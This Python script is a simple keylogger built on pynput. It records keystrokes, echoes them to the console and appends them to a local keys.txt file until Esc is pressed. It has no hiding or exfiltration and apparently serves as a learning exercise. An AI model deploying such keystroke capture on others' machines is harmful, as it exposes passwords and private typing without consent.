from pynput.keyboard import Key, Listener
count =0
keys = []
def on_press(key):
    global keys, count
    keys.append(str(key))
    count+=1
    print(str(key))
    if count >=10:
        write_file(keys)
        count =0
        keys = []

    
def write_file(keys):
    print("Hi")
    with open('keys.txt',"a") as f:
        for key in keys:
            k = key.replace("'","")
            if k.find("Key") ==-1:
                f.write(k)
            elif k.find("space") >0:
                f.write("\n")
def on_release(key):
    if key == Key.esc:
        write_file(keys)
        count =0
        return False
    

with Listener (on_press=on_press, on_release =on_release) as listener:
    listener.join()